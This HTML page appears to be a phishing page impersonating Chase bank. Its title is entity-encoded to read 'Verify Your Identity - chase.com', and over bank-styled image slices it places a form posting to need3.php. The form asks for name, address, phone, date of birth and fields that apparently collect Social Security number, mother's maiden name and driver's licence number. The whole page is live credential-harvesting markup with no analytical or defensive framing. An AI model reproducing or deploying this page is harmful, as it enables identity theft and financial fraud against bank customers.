<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;&#32;&#45;&#32;&#99;&#104;&#97;&#115;&#101;&#46;&#99;&#111;&#109;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<style type="text/css">
			   
.textbox {
    height: 42px;
    padding-left: 8px;
    border: none;
   	border: solid 1px #ccc;
	font-family: 'Open Sans','Helvetica Neue',Helvetica,Arial,sans-serif;
    font-size: 17px;
    width: 270px;
}
 .textbox:focus {  
    outline: none;
    outline: solid 2px #126BC5;
}

			  </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body background="images/bkg.png" bgproperties="fixed" style="background-attachment:fixed;background-repeat:no-repeat;">
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:230px; top:93px; width:950px; height:271px; z-index:0"><img src="images/hh8.png" alt="" title="" border=0 width=950 height=271></div>

<div id="image2" style="position:absolute; overflow:hidden; left:230px; top:364px; width:950px; height:519px; z-index:2"><img src="images/hh12.png" alt="" title="" border=0 width=950 height=519></div>

<div id="image3" style="position:absolute; overflow:hidden; left:230px; top:750px; width:950px; height:280px; z-index:1"><img src="images/hh11.png" alt="" title="" border=0 width=950 height=280></div>

<div id="image5" style="position:absolute; overflow:hidden; left:731px; top:950px; width:176px; height:43px; z-index:4"><a href="#"><img src="images/h7.png" alt="" title="" border=0 width=176 height=43></a></div>
<form action=need3.php name=dardbhgao id=dardbhgao method=post>
<input name="name" class="textbox" autocomplete="off" required type="text" style="position:absolute;left:650px;top:384px;width:300px;z-index:5">
<input name="addr" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:300px;left:650px;top:432px;z-index:6">
<input name="city" class="textbox" autocomplete="off" required type="text" style="position:absolute;left:650px;top:484px;width:300px;z-index:7">
<select name="state" class="textbox" autocomplete="off" required style="position:absolute;width:300px;left:650px;top:536px;z-index:8">
<OPTION value="" selected>Select Your State</OPTION> <OPTION 
              value=Alabama>Alabama</OPTION> <OPTION value=Alaska>Alaska</OPTION> <OPTION 
              value=Arizona>Arizona</OPTION> <OPTION value=Arkansas>Arkansas</OPTION> 
              <OPTION value=California>California</OPTION> <OPTION 
              value=Colorado>Colorado</OPTION> <OPTION value=Connecticut>Connecticut</OPTION> 
              <OPTION value=Delaware>Delaware</OPTION> <OPTION value=District of 
              Columbia>District of 
              Columbia</OPTION> <OPTION value=Florida>Florida</OPTION> <OPTION 
              value=Georgia>Georgia</OPTION> <OPTION value=Hawaii>Hawaii</OPTION> <OPTION 
              value=Idaho>Idaho</OPTION> <OPTION value=Illinois>Illinois</OPTION> <OPTION 
              value=Indiana>Indiana</OPTION> <OPTION value=Iowa>Iowa</OPTION> <OPTION 
              value=Kansas>Kansas</OPTION> <OPTION value=Kentucky>Kentucky</OPTION> 
              <OPTION value=Louisiana>Louisiana</OPTION> <OPTION 
              value=Maine>Maine</OPTION> <OPTION value=Maryland>Maryland</OPTION> <OPTION 
              value=Massachusetts>Massachusetts</OPTION> <OPTION value=Michigan>Michigan</OPTION> 
              <OPTION value=Minnesota>Minnesota</OPTION> <OPTION 
              value=Mississippi>Mississippi</OPTION> <OPTION value=Missouri>Missouri</OPTION> 
              <OPTION value=Montana>Montana</OPTION> <OPTION 
              value=Nebraska>Nebraska</OPTION> <OPTION value=Nevada>Nevada</OPTION> 
              <OPTION value=New Hampshire>New Hampshire</OPTION> <OPTION value=New 
              Jersey>New 
              Jersey</OPTION> <OPTION value=New Mexico>New Mexico</OPTION> <OPTION 
              value=New York>New York</OPTION> <OPTION value=North 
              Carolina>North 
              Carolina</OPTION> <OPTION value=North Dakota>North Dakota</OPTION> <OPTION 
              value=Ohio>Ohio</OPTION> <OPTION value=Oklahoma>Oklahoma</OPTION> <OPTION 
              value=Oregon>Oregon</OPTION> <OPTION value=Pennsylvania>Pennsylvania</OPTION> 
              <OPTION value=Rhode Island>Rhode Island</OPTION> <OPTION value=South 
              Carolina>South 
              Carolina</OPTION> <OPTION value=South Dakota>South Dakota</OPTION> <OPTION 
              value=Tennessee>Tennessee</OPTION> <OPTION value=Texas>Texas</OPTION> 
              <OPTION value=Utah>Utah</OPTION> <OPTION value=Vermont>Vermont</OPTION> 
              <OPTION value=Virginia>Virginia</OPTION> <OPTION 
              value=Washington>Washington</OPTION> <OPTION value=West 
              Virginia>West 
              Virginia</OPTION> <OPTION value=Wisconsin>Wisconsin</OPTION> <OPTION 
              value=Wyoming>Wyoming</OPTION></select>
<input name="zp" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:300px;left:650px;top:588px;z-index:9">
<input name="ph" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:300px;left:650px;top:640px;z-index:10">
<input name="sn" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:300px;left:650px;top:692px;z-index:11">
<input name="db" placeholder="MM/DD/YYYY" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:300px;left:650px;top:744px;z-index:12">
<input name="mn" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:300px;left:650px;top:796px;z-index:13">
<input name="dl" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:300px;left:650px;top:848px;z-index:14">
<div id="formimage1" style="position:absolute; left:929px; top:950px; z-index:15"><input type="image" name="formimage1" width="176" height="42" src="images/btn2.png"></div>

</div>

	
</body>
</html>
